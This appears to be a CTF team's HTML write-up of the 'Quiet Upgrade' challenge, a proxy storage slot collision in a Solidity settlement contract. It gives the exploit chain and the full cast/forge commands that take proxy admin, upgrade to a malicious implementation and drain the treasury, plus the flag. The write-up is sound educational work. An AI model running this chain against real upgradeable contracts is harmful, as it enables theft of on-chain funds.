@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Quiet Upgrade · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The proxy keeps its admin in slot 0, and the implementation's open registerBranch() writes slot 0 through delegatecall. Taking admin that way and upgrading to a malicious implementation lets us release the treasury's reserve." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>quiet-upgrade</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Quiet Upgrade <span class="page-sub">Proxy storage slot collision</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-misc">misc</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_4bcccd7d74}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p>Flag: <code>hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_4bcccd7d74}</code></p>
+<h2 id="win-condition"><a class="wu-anchor" href="#win-condition" aria-hidden="true">#</a>Win condition</h2>
+<p><code>Setup.isSolved()</code> - the treasury&#39;s STL reserve must fall below 1% of its starting 5_000_000 ether.
+The only way STL leaves <code>Treasury</code> is <code>release(to, amount)</code>, gated on <code>msg.sender == settlementSystem</code>,
+and <code>settlementSystem</code> is wired to the <strong>proxy</strong>.</p>
+<h2 id="the-bug-naive-proxy-slot-collision"><a class="wu-anchor" href="#the-bug-naive-proxy-slot-collision" aria-hidden="true">#</a>The bug: naive proxy slot collision</h2>
+<p><code>SettlementProxy</code> keeps its pointers in plain sequential slots:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">slot 0  admin
+slot 1  implementation</code></pre>
+      
+    </figure><p>but <code>SettlementV1</code> - reached only through the proxy&#39;s <code>delegatecall</code> fallback - declares its own
+storage starting at slot 0:</p>
+<figure class="wu-code wu-code-output" data-lines="5">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">slot 0  branchOperator        (collides with proxy.admin)
+slot 1  branchRegistrar       (collides with proxy.implementation; never written by V1)
+slot 2  branchClaimed
+slot 3  ledger
+slot 4  totalSettled</code></pre>
+      
+    </figure><p><code>registerBranch(operator)</code> is open (there is no registrar wired in) and writes
+<code>branchOperator = operator</code>, i.e. <strong>proxy slot 0 → proxy.admin</strong>. That is a direct admin takeover.
+Slot 1 is never written by V1, so the implementation pointer is not clobbered by accident.</p>
+<h2 id="exploit-chain"><a class="wu-anchor" href="#exploit-chain" aria-hidden="true">#</a>Exploit chain</h2>
+<ol>
+<li><code>proxy.registerBranch(player)</code> - fallback → delegatecall into V1 → <code>proxy.admin = player</code>.
+(Confirmed via <code>cast call proxy &#39;admin()(address)&#39;</code> before proceeding.)</li>
+<li>Deploy a malicious implementation and prove it was built for this proxy:
+<code>proxiableSlot()</code> must return <code>keccak256(abi.encodePacked(keccak256(&quot;quiet-upgrade.proxiable&quot;), address(this)))</code>
+with <code>address(this)</code> = the proxy. Reproduced off-chain:
+<code>0xbd66a804753105e7deead67d70049a37cd9a22a3f7e9631e4bcb7f4b89c25adf</code>.</li>
+<li><code>proxy.upgradeTo(malicious)</code> - admin-only, guard satisfied.</li>
+<li><code>proxy.drain()</code> - delegatecall into the malicious impl; it calls
+<code>treasury.release(player, reserveBalance())</code>. Because the code runs in the proxy&#39;s context,
+the external call to <code>Treasury</code> originates from the proxy address, so
+<code>require(msg.sender == settlementSystem)</code> passes.</li>
+</ol>
+<h2 id="addresses-this-instance-chain-id-31337"><a class="wu-anchor" href="#addresses-this-instance-chain-id-31337" aria-hidden="true">#</a>Addresses (this instance, chain_id 31337)</h2>
+<figure class="wu-code wu-code-output" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">setup     0xBFbFE7494F89DCb565CCe17f37B3Dd0e7De3beD4
+player    0xeA99e9697FBB584E1149744A420Fd26A4B32919B
+proxy     0xd9cd37180cd01d80521f20f7bf3c0d55aa909672
+treasury  0xf57d512437b9aba5a5f0017386a928eed0da4a86
+stl       0x86f5cb0e1f3e2e14658da4e2cf74285711e9f8c4
+ops       0xd2da42204fae27d6a0d69541787b2fdedf0c5c14
+malicious 0xDa0FBD7b18Ac5A666705e9fd9774018D5E149874</code></pre>
+      
+    </figure><h2 id="result"><a class="wu-anchor" href="#result" aria-hidden="true">#</a>Result</h2>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">treasury reserve: 5000000000000000000000000 -&gt; 0
+player STL:       200000000000000000000 -&gt; 5000200000000000000000000
+isSolved():       true
+GET /flag:        hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_4bcccd7d74}</code></pre>
+      
+    </figure><h2 id="commands"><a class="wu-anchor" href="#commands" aria-hidden="true">#</a>Commands</h2>
+<figure class="wu-code" data-lines="12">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>/.foundry/bin&quot;</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">R=https://quiet-upgrade-8a81d12597a1.chall.hiddeninvestigations.net/</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">PK=0x...   <span class="hljs-comment"># from GET /info</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">P=0xd9cd37180cd01d80521f20f7bf3c0d55aa909672</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">T=0xf57d512437b9aba5a5f0017386a928eed0da4a86</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">cast send <span class="hljs-variable">$P</span> <span class="hljs-string">&#x27;registerBranch(address)&#x27;</span> <span class="hljs-variable">$PLAYER</span> --rpc-url <span class="hljs-variable">$R</span> --private-key <span class="hljs-variable">$PK</span></span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">forge create Malicious.sol:Malicious --rpc-url <span class="hljs-variable">$R</span> --private-key <span class="hljs-variable">$PK</span> --broadcast \</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">  --constructor-args <span class="hljs-variable">$P</span> <span class="hljs-variable">$T</span> <span class="hljs-variable">$PLAYER</span></span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">cast send <span class="hljs-variable">$P</span> <span class="hljs-string">&#x27;upgradeTo(address)&#x27;</span> <span class="hljs-variable">$MALICIOUS</span> --rpc-url <span class="hljs-variable">$R</span> --private-key <span class="hljs-variable">$PK</span></span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">cast send <span class="hljs-variable">$P</span> <span class="hljs-string">&#x27;drain()&#x27;</span> --rpc-url <span class="hljs-variable">$R</span> --private-key <span class="hljs-variable">$PK</span></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">curl -s <span class="hljs-variable">$R</span>/flag</span></span></code></pre>
+      
+    </figure>
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#win-condition">Win condition</a></li><li><a href="#the-bug-naive-proxy-slot-collision">The bug: naive proxy slot collision</a></li><li><a href="#exploit-chain">Exploit chain</a></li><li><a href="#addresses-this-instance-chain-id-31337">Addresses (this instance, chain_id 31337)</a></li><li><a href="#result">Result</a></li><li><a href="#commands">Commands</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="standing-order.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Standing Order</span></a>
+    <a class="wu-pager-link wu-pager-next" href="hollow-reserve.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Hollow Reserve</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
